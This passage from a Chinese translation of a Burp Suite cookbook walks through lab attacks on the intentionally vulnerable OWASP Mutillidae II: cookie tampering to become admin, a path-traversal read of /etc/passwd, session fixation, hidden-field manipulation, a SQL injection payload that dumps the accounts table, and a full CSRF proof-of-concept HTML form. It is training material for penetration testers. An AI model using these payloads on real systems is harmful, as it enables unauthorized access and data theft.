![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00196.jpeg)

1.  查看列表中的`GET`请求；注意**Cookie:**行上显示的 cookie 名称/值对。

最感兴趣的名称/值对包括`username=john`和`uid=3`。如果我们尝试将这些值操纵到不同的角色会发生什么？

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00197.jpeg)

1.  让我们尝试操纵存储在 cookie 中的`username`和`uid`参数到不同的角色。我们将使用 Burp 的**代理** | **拦截**来帮助我们执行此攻击。

1.  切换到**代理** | **拦截**选项卡，然后按下**拦截已打开**按钮。返回到 Firefox 浏览器并重新加载登录页面。

1.  在**代理** | **拦截**选项卡中暂停请求。在暂停时，将分配给用户名的值从`john`更改为`admin`。同时，将分配给`uid`的值从`3`更改为`1`。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00198.jpeg)

1.  点击**转发**按钮，然后再次按下**拦截已打开**以切换拦截按钮为**关闭（拦截已关闭）**。

1.  返回到 Firefox 浏览器，注意我们现在以管理员身份登录！我们能够从普通用户升级到管理员，因为开发人员没有对分配的角色执行任何授权检查：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00199.jpeg)

# 它是如何工作的...

在这个示例中显示的特权升级攻击中存在几个应用程序问题。与帐户配置（即角色分配）相关的任何操作都应该只允许管理员执行。如果没有适当的检查，用户可以尝试升级他们的配置角色。在这个示例中展示的另一个问题是顺序用户 ID 号（例如，`uid=3`）。由于这个数字很容易被猜到，并且因为大多数应用程序都从管理员帐户开始，将数字从`3`更改为`1`似乎是与管理员帐户相关的一个可能的猜测。

# 测试不安全的直接对象引用（IDOR）

基于用户提供的输入允许未经授权直接访问文件或资源的系统被称为**不安全的直接对象引用**（**IDOR**）。这种漏洞允许绕过对这些文件或资源放置的授权检查。IDOR 是由于在应用程序代码中未经检查的用户提供的输入来检索对象而未执行授权检查的结果。

# 准备工作

使用 OWASP Mutillidae II 作为我们的目标应用程序，让我们操纵`phpfile`参数的值，以确定我们是否可以调用系统上的直接对象引用，例如`/etc/passwd`文件。

# 如何做到这一点...

1.  从 Mutillidae 菜单中，选择**OWASP 2013** | **A4 – 不安全的直接对象引用** | **源代码查看器**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00200.jpeg)

1.  从**源代码查看器**页面，使用下拉框中选择的默认文件（`upload-file.php`），点击**查看文件**按钮以查看文件内容显示在按钮下方：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00201.jpeg)

1.  切换到 Burp 的**代理** | **HTTP 历史**选项卡。找到您刚刚在查看`upload-file.php`文件时所做的`POST`请求。注意带有要显示的文件值的`phpfile`参数。如果我们将此参数的值更改为其他内容会发生什么？

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00202.jpeg)

1.  让我们通过操纵提供给`phpfile`参数的值来执行 IDOR 攻击，以引用系统上的文件。例如，让我们尝试通过 Burp 的**代理** | **拦截**功能将`upload-file.php`的值更改为`../../../../etc/passwd`。

1.  要执行此攻击，请按照以下步骤进行。

1.  切换到**代理** | **拦截**选项卡，并按下**拦截已开启**按钮。

1.  返回到 Firefox 浏览器并重新加载登录页面。请求被暂停，并包含在**代理** | **拦截**选项卡中。

1.  1.  由于请求被暂停，将`phpfile`参数分配的值更改为`../../../../etc/passwd`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00203.jpeg)

1.  点击**转发**按钮。现在再次按下**拦截已开启**按钮，将拦截按钮切换为**关闭（拦截已关闭）**。

1.  返回到 Firefox 浏览器。注意我们现在可以看到`/etc/passwd`文件的内容！

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00204.jpeg)

# 工作原理...

由于应用程序代码中对`phpfile`参数缺乏适当的授权检查，我们能够查看系统上的特权文件。开发人员和系统管理员在揭示敏感文件和资源之前提供访问控制和检查。当这些访问控制缺失时，可能存在 IDOR 漏洞。


# 第六章：评估会话管理机制

在本章中，我们将涵盖以下示例：

+   使用 Sequencer 测试会话令牌强度

+   测试 cookie 属性

+   测试会话固定

+   测试暴露的会话变量

+   测试跨站请求伪造

# 介绍

本章涵盖了用于绕过和评估会话管理方案的技术。应用程序使用会话管理方案来跟踪用户活动，通常是通过会话令牌。会话管理的 Web 评估还涉及确定所使用的会话令牌的强度以及这些令牌是否得到了适当的保护。我们将学习如何使用 Burp 执行这些测试。

# 软件工具要求

要完成本章的示例，您需要以下内容：

+   OWASP Broken Web Applications（VM）

+   OWASP Mutillidae 链接

+   Burp 代理社区版或专业版（[`portswigger.net/burp/`](https://portswigger.net/burp/)）

+   配置了允许 Burp 代理流量的 Firefox 浏览器（[`www.mozilla.org/en-US/firefox/new/`](https://www.mozilla.org/en-US/firefox/new/)）

# 使用 Sequencer 测试会话令牌强度

为了跟踪应用程序内页面到页面的用户活动，开发人员为每个用户创建和分配唯一的会话令牌值。大多数会话令牌机制包括会话 ID、隐藏表单字段或 cookie。Cookie 被放置在用户的浏览器中，位于客户端。

这些会话令牌应该由渗透测试人员检查，以确保它们的唯一性、随机性和密码强度，以防止信息泄露。

如果会话令牌值很容易被猜到或在登录后保持不变，攻击者可以将预先已知的令牌值应用（或固定）到用户身上。这被称为**会话固定攻击**。一般来说，攻击的目的是收集用户帐户中的敏感数据，因为攻击者知道会话令牌。

# 准备工作

我们将检查 OWASP Mutillidae II 中使用的会话令牌，以确保它们以安全和不可预测的方式创建。能够预测和伪造弱会话令牌的攻击者可以执行会话固定攻击。

# 如何做…

确保 Burp 和 OWASP BWA VM 正在运行，并且已经在用于查看 OWASP BWA 应用程序的 Firefox 浏览器中配置了 Burp。

1.  从**OWASP BWA Landing**页面，点击链接到 OWASP Mutillidae II 应用程序。

1.  打开 Firefox 浏览器，访问 OWASP Mutillidae II 的主页（URL：`http://<your_VM_assigned_IP_address>/mutillidae/`）。确保您正在启动一个新的 Mutillidae 应用程序会话，而不是已经登录：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00205.jpeg)

1.  切换到代理 | HTTP 历史记录选项卡，并选择显示您最初浏览 Mutillidae 主页的请求。

1.  查找`GET`请求和包含`Set-Cookie:`分配的相关响应。每当看到这个分配时，您可以确保您获得了一个新创建的会话 cookie。具体来说，我们对`PHPSESSID` cookie 值感兴趣：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00206.jpeg)

1.  突出显示`PHPSESSID` cookie 的值，右键单击，并选择发送到 Sequencer：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00207.jpeg)

Sequencer 是 Burp 中用于确定会话令牌内部创建的随机性或质量的工具。

1.  将`PHPSESSID`参数的值发送到 Sequencer 后，您将看到该值加载在“选择实时捕获请求”表中。

1.  在按下“开始实时捕获”按钮之前，向下滚动到响应中的令牌位置部分。在 Cookie 下拉列表中，选择`PHPSESSID=<捕获的会话令牌值>`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00208.jpeg)

1.  由于我们已经选择了正确的 cookie 值，我们可以开始实时捕获过程。单击开始实时捕获按钮，Burp 将发送多个请求，从每个响应中提取 PHPSESSID cookie。在每次捕获后，Sequencer 对每个令牌的随机性水平进行统计分析。

1.  允许捕获收集和分析至少 200 个令牌，但如果您愿意，可以让其运行更长时间：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00209.jpeg)

1.  一旦您至少有 200 个样本，点击立即分析按钮。每当您准备停止捕获过程时，按停止按钮并确认是：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00210.jpeg)

1.  分析完成后，Sequencer 的输出提供了一个总体结果。在这种情况下，PHPSESSID 会话令牌的随机性质量非常好。有效熵的数量估计为 112 位。从 Web 渗透测试人员的角度来看，这些会话令牌非常强大，因此在这里没有漏洞可报告。但是，尽管没有漏洞存在，对会话令牌进行此类检查是一个良好的做法：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00211.jpeg)

# 它是如何工作的...

要更好地理解 Sequencer 背后的数学和假设，请参阅 Portswigger 关于该主题的文档：[`portswigger.net/burp/documentation/desktop/tools/sequencer/tests`](https://portswigger.net/burp/documentation/desktop/tools/sequencer/tests)。

# 测试 cookie 属性

重要的特定于用户的信息，例如会话令牌，通常存储在客户端浏览器的 cookie 中。由于它们的重要性，cookie 需要受到恶意攻击的保护。这种保护通常以两个标志的形式出现——**安全**和**HttpOnly**。

安全标志告诉浏览器，只有在协议加密时（例如 HTTPS，TLS）才将 cookie 发送到 Web 服务器。该标志保护 cookie 免受在未加密通道上的窃听。

HttpOnly 标志指示浏览器不允许通过 JavaScript 访问或操纵 cookie。该标志保护 cookie 免受跨站点脚本攻击。

# 做好准备

检查 OWASP Mutillidae II 应用程序中使用的 cookie，以确保保护标志的存在。由于 Mutillidae 应用程序在未加密的通道上运行（例如 HTTP），我们只能检查是否存在 HttpOnly 标志。因此，安全标志不在此处范围之内。

# 操作步骤...

确保 Burp 和 OWASP BWA VM 正在运行，并且 Burp 已配置在用于查看 OWASP BWA 应用程序的 Firefox 浏览器中。

1.  从**OWASP BWA 着陆**页面，点击链接到 OWASP Mutillidae II 应用程序。

1.  打开 Firefox 浏览器，访问 OWASP Mutillidae II 的主页（URL：`http://<your_VM_assigned_IP_address>/mutillidae/`）。确保您开始了一个新的会话，并且没有登录到 Mutillidae 应用程序：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00212.jpeg)

1.  切换到代理| HTTP 历史选项卡，并选择显示您最初浏览 Mutillidae 主页的请求。查找`GET`请求及其相关的包含`Set-Cookie:`分配的响应。每当看到这个分配时，您可以确保您获得了一个新创建的会话 cookie。具体来说，我们对`PHPSESSID` cookie 值感兴趣。

1.  检查`Set-Cookie:`分配行的末尾。注意两行都没有 HttpOnly 标志。这意味着 PHPSESSID 和 showhints cookie 值没有受到 JavaScript 操纵的保护。这是一个安全发现，您应该在报告中包括：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00213.jpeg)

# 它是如何工作的...

如果两个 cookie 都设置了 HttpOnly 标志，那么标志将出现在 Set-Cookie 分配行的末尾。当存在时，该标志将紧随着结束 cookie 的路径范围的分号，后面是字符串 HttpOnly。`Secure`标志的显示也类似：

```
Set-Cookie: PHPSESSID=<session token value>;path=/;Secure;HttpOnly;
```

# 测试会话固定

会话令牌被分配给用户以进行跟踪。这意味着在未经身份验证时浏览应用程序时，用户会被分配一个唯一的会话 ID，通常存储在 cookie 中。应用程序开发人员应该在用户登录网站后创建一个新的会话令牌。如果这个会话令牌没有改变，应用程序可能容易受到会话固定攻击的影响。确定这个令牌是否从未经身份验证状态到经过身份验证状态改变的值是 Web 渗透测试人员的责任。

当应用程序开发人员不使未经身份验证的会话令牌失效时，会话固定就存在。这使得用户可以在身份验证后继续使用相同的会话令牌。这种情况允许具有窃取会话令牌的攻击者冒充用户。

# 准备工作

使用 OWASP Mutillidae II 应用程序和 Burp 的 Proxy HTTP 历史和 Comparer，我们将检查未经身份验证的 PHPSESSID 会话令牌值。然后，我们将登录应用程序，并将未经身份验证的值与经过身份验证的值进行比较，以确定会话固定漏洞的存在。

# 操作步骤

1.  导航到登录界面（从顶部菜单中点击登录/注册），但暂时不要登录。

1.  切换到 Burp 的**Proxy** HTTP 历史选项卡，并查找显示您浏览到登录界面时的`GET`请求。记下放置在 cookie 中的`PHPSESSID`参数的值：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00214.jpeg)

1.  右键单击`PHPSESSID`参数并将请求发送到 Comparer：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00215.jpeg)

1.  返回登录界面（从顶部菜单中点击登录/注册），这次使用用户名`ed`和密码`pentest`登录。

1.  登录后，切换到 Burp 的**Proxy** HTTP 历史选项卡。查找显示您的登录的`POST`请求（例如，302 HTTP 状态代码），以及紧随`POST`之后的即时`GET`请求。注意登录后分配的`PHPSESSID`。右键单击并将此请求发送到 Comparer。

1.  切换到 Burp 的 Comparer。适当的请求应该已经为您突出显示。点击右下角的 Words 按钮：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00216.jpeg)

弹出窗口显示了两个请求之间的差异的详细比较。注意`PHPSESSID`的值在未经身份验证的会话（左侧）和经过身份验证的会话（右侧）之间没有变化。这意味着应用程序存在会话固定漏洞：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00217.jpeg)

# 工作原理…

在这个示例中，我们检查了未经身份验证用户分配的`PHPSESSID`值，即使在身份验证后仍保持不变。这是一个安全漏洞，允许进行会话固定攻击。

# 测试暴露的会话变量

诸如令牌、cookie 或隐藏表单字段之类的会话变量被应用程序开发人员用于在客户端和服务器之间发送数据。由于这些变量在客户端暴露，攻击者可以操纵它们，试图获取未经授权的数据或捕获敏感信息。

Burp 的 Proxy 选项提供了一个功能，可以增强所谓的*隐藏*表单字段的可见性。这个功能允许 Web 应用程序渗透测试人员确定这些变量中保存的数据的敏感级别。同样，渗透测试人员可以确定操纵这些值是否会导致应用程序行为不同。

# 准备工作

使用 OWASP Mutillidae II 应用程序和 Burp 的 Proxy 的 Unhide hidden form fields 功能，我们将确定隐藏表单字段值的操纵是否会导致获取未经授权的数据访问。

# 操作步骤

1.  切换到 Burp 的**Proxy**选项卡，向下滚动到响应修改部分，并选中 Unhide hidden form fields 和 Prominently highlight unhidden fields 的复选框：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00218.jpeg)

1.  导航到**User Info**页面。OWASP 2013 | A1 – Injection (SQL) | SQLi – Extract Data | User Info (SQL)：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00219.jpeg)

1.  注意现在页面上明显显示的隐藏表单字段：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00220.jpeg)

1.  让我们尝试操纵所显示的值，将`user-info.php`更改为`admin.php`，并查看应用程序的反应。在隐藏字段[page]文本框中将`user-info.php`修改为`admin.php`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00221.jpeg)

1.  在进行更改后按下*Enter*键。现在您应该看到一个新页面加载，显示**PHP 服务器配置**信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00222.jpeg)

# 工作原理...

正如本教程中所看到的，隐藏表单字段并没有什么隐秘。作为渗透测试人员，我们应该检查和操纵这些值，以确定是否无意中暴露了敏感信息，或者我们是否可以改变应用程序的行为，使其与我们的角色和身份验证状态所期望的不同。在本教程中，我们甚至没有登录到应用程序中。我们操纵了标记为**page**的隐藏表单字段，以访问包含指纹信息的页面。这样的信息访问应该受到未经身份验证的用户的保护。

# 测试跨站请求伪造

**跨站请求伪造**（**CSRF**）是一种利用经过身份验证的用户会话来允许攻击者强制用户代表其执行不需要的操作的攻击。这种攻击的初始诱饵可能是钓鱼邮件或通过受害者网站上发现的跨站脚本漏洞执行的恶意链接。CSRF 利用可能导致数据泄露，甚至完全妥协 Web 应用程序。

# 准备工作

使用 OWASP Mutillidae II 应用程序注册表单，确定在同一浏览器（不同标签页）中是否可能发生 CSRF 攻击，同时已经有一个经过身份验证的用户登录到应用程序中。

# 如何做...

为了对本教程进行基准测试，首先基线化账户表中当前的记录数量，并执行 SQL 注入来查看：

1.  导航到**用户信息**页面：OWASP 2013 | A1 – Injection (SQL) | SQLi – Extract Data | User Info (SQL)。

1.  在用户名提示处，输入一个 SQL 注入有效负载来转储整个账户表内容。有效负载是`' or 1=1--` <space>（单引号或 1 等于 1 破折号空格）。然后点击查看账户详情按钮。

1.  请记住在两个破折号后包括空格，因为这是一个 MySQL 数据库；否则，有效负载将无法工作：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00223.jpeg)

1.  当操作正确时，会显示一个消息，指出数据库中找到了 24 条用户记录。消息后显示的数据显示了所有 24 个账户的用户名、密码和签名字符串。这里只显示了两个账户的详细信息作为示例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00224.jpeg)

我们确认数据库的账户表中目前存在 24 条记录。

1.  现在，返回到登录页面（从顶部菜单中点击登录/注册），并选择“请在此注册”链接。

1.  点击“请在此注册”链接后，会出现一个注册表格。

1.  填写表格以创建一个测试账户。将用户名输入为*tester*，密码输入为*tester*，签名输入为`This is a tester account`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00225.jpeg)

1.  点击创建账户按钮后，您应该收到一个绿色横幅，确认账户已创建：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00226.jpeg)

1.  返回到**用户信息**页面：**OWASP 2013| A1 – Injection (SQL) | SQLi – Extract Data | User Info (SQL)**。

1.  再次执行 SQL 注入攻击，并验证您现在可以在账户表中看到 25 行，而不是之前的 24 行：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00227.jpeg)

1.  切换到 Burp 的代理 HTTP 历史记录标签，并查看创建测试账户的`POST`请求。

1.  研究这个`POST`请求显示了`POST`操作（`register.php`）和执行操作所需的主体数据，即`用户名`、`密码`、`确认密码`和`我的签名`。还要注意没有使用 CSRF 令牌。CSRF 令牌被放置在 Web 表单中，以防止我们即将执行的攻击。让我们继续。

1.  右键单击`POST`请求，然后单击发送到 Repeater：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00228.jpeg)

1.  如果您使用 Burp Professional，请右键单击选择 Engagement 工具|生成 CSRF PoC：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00229.jpeg)

1.  单击此功能后，将生成一个弹出框，其中包含在注册页面上使用的相同表单，但没有任何 CSRF 令牌保护：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00230.jpeg)

1.  如果您使用 Burp Community，可以通过查看注册页面的源代码轻松重新创建**CSRF PoC**表单：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00231.jpeg)

1.  在查看页面源代码时，向下滚动到`<form>`标签部分。为简洁起见，下面重新创建了表单。将`attacker`作为用户名、密码和签名的值。复制以下 HTML 代码并将其保存在名为`csrf.html`的文件中：

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://192.168.56.101/mutillidae/index.php?page=register.php" method="POST">
      <input type="hidden" name="csrf-token" value="" />
      <input type="hidden" name="username" value="attacker" />
      <input type="hidden" name="password" value="attacker" />
      <input type="hidden" name="confirm_password" value="attacker" 
/>      <input type="hidden" name="my_signature" value="attacker account" />
      <input type="hidden" name="register-php-submit-button" value="Create Account" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

1.  现在，返回到登录屏幕（从顶部菜单中单击登录/注册），并使用用户名`ed`和密码`pentest`登录应用程序。

1.  打开您的计算机上保存了`csrf.html`文件的位置。将文件拖到已经通过身份验证的 ed 的浏览器中。在您将文件拖到此浏览器后，`csrf.html`将出现为同一浏览器中的单独标签：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00232.jpeg)

1.  出于演示目的，有一个提交请求按钮。但是，在实际情况中，JavaScript 函数会自动执行创建攻击者帐户的操作。单击提交请求按钮：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00233.jpeg)

您应该收到一个确认消息，即攻击者帐户已创建：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00234.jpeg)

1.  切换到 Burp 的 Proxy | HTTP history 选项卡，并找到恶意执行的用于在 ed 的经过身份验证的会话上创建攻击者帐户的`POST`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00235.jpeg)

1.  返回到**用户信息**页面：OWASP 2013 | A1 – Injection (SQL) | SQLi – Extract Data | User Info (SQL)，然后再次执行 SQL 注入攻击。现在，您将看到帐户表中的行数从之前的 25 行增加到 26 行：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00236.jpeg)

# 它是如何工作的...

CSRF 攻击需要一个经过身份验证的用户会话，以便代表攻击者在应用程序中秘密执行操作。在这种情况下，攻击者利用 ed 的会话重新运行注册表单，为攻击者创建一个帐户。如果`ed`是管理员，这可能会允许提升帐户角色。
